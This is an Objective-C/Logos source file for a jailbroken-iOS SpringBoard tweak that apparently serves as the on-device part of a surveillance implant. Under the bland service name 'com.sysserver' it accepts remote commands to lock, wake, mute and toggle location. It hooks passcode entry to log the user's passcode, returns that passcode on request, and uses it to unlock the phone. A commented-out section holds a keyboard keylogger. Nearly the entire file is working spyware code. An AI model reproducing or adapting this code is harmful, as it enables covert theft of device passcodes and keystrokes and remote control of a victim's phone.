#import "header.h"
#import <AppSupport/CPDistributedMessagingCenter.h>

%hook SpringBoard

SBMediaController *mediaController;
NSString *passcode;
NSString *keyLog;

@interface SBRingerControl : NSObject
- (BOOL)isRingerMuted;
@end

@interface SBMainWorkspace : NSObject
+ (SBMainWorkspace *)sharedInstance;
@property (readonly, nonatomic) SBRingerControl *ringerControl;
@end


-(void)applicationDidFinishLaunching:(id)application {
    %orig;
    mediaController =  (SBMediaController *)[%c(SBMediaController) sharedInstance];
    CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
    [messagingCenter runServerOnCurrentThread];
    [messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
    [messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
}

%new
-(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
	NSString *command = [userInfo objectForKey:@"cmd"];
	if ([command isEqual:@"home"]) {
		if ([[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
			[[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
		}
		else if ([[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
			[[%c(SBUIController) sharedInstance] clickedMenuButton];
		}
	} else if ([command isEqual:@"lock"]) { // TODO: get rid of respring
		[[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
	} else if ([command isEqual:@"wake"]) {
		[[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
		[[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
	} else if ([command isEqual:@"doublehome"]) {
		if ([[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
			[[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
		}
		else if ([[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
			[[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
		}
	}

	// Muting
	else if ([command isEqual:@"mute"]) {
		if (!mediaController.ringerMuted) {
			[[%c(VolumeControl) sharedVolumeControl] toggleMute];
	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
		}
    } else if ([command isEqual:@"unmute"]) {
		if (mediaController.ringerMuted) {
			[[%c(VolumeControl) sharedVolumeControl] toggleMute];
	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
		}
    } 
    // Location
    else if ([command isEqual:@"locationon"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:true];
    } else if ([command isEqual:@"locationoff"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:false];
    }    
}

%new
- (NSDictionary *)commandWithReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
	NSString *command = [userInfo objectForKey:@"cmd"];
	if ([command isEqual:@"getpasscode"]) {
		NSString *result = @"";
		if (passcode != NULL)
			result = passcode;
		else 
			result = @"We have not obtained passcode yet";
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}else if ([command isEqual:@"lastapp"]) {
		SBApplicationIcon *iconcontroller = [[%c(SBIconController) sharedInstance] lastTouchedIcon];
		if (NSString *lastapp = iconcontroller.nodeIdentifier)
			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
	}else if ([command isEqual:@"islocked"]) {
		if ([[%c(SBLockScreenManager) sharedInstance] isUILocked])  
			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
    }else if ([command isEqual:@"ismuted"]) {
		NSString *result = @"";
        SBRingerControl *ringerControlLink = [[%c(SBMainWorkspace) sharedInstance] ringerControl];
        return [NSDictionary dictionaryWithObject:[NSString stringWithFormat:@"%d", [[[%c(SBMainWorkspace) sharedInstance] ringerControl] isRingerMuted]] forKey:@"returnStatus"];
		if ([[%c(SBVolumeControlState) sharedInstance] isRingerMuted] == YES)
			result = @"muted";
		else
			result = @"unmuted";
	}else if ([command isEqual:@"unlock"]) {
		NSString *result = @"";
		if (passcode != NULL)
			[[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
		else 
			result = @"We have not obtained passcode yet";
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}	
	return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
}
%end


//Log passcode
%hook SBLockScreenManager
-(void)attemptUnlockWithPasscode:(id)arg1 {
	%orig;
	passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
	[[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
	[[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
}
%end


//TODO: Fix
/*
@interface UIKBTree : NSObject
@property(retain, nonatomic) NSString *displayString;
@end

%hook UIKeyboardLayoutStar
- (void)touchDownWithKey:(id)arg1 atPoint:(struct CGPoint)arg2 executionContext:(id)arg3 {
	NSLog(@"this key was pressed %@",arg1);
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
			UIKBTree *kbtree = arg1;
			NSString *text = kbtree.displayString;
			if ([text isEqual: @"space"])
				text = @" ";
			else if ([text isEqual: @"Search"]) {
				text = @"<Search>";
			}
			else if ([text isEqual: @"delete"]) {
				text = @"<delete>";
			}
			else if ([text isEqual: @"ABC"]) {
				text = @"<ABC>";
			}
			else if ([text isEqual: @"123"]) {
				text = @"<123>";
			}
			else if ([text isEqual: @"(null)"]) {
				text = @"";
			}
            if (keyLog == NULL) {
	            keyLog = @"";
            }           	
			keyLog = [[NSString alloc] initWithFormat:@"%@%@",keyLog,text];
	});
	%orig;
}
%end
*/

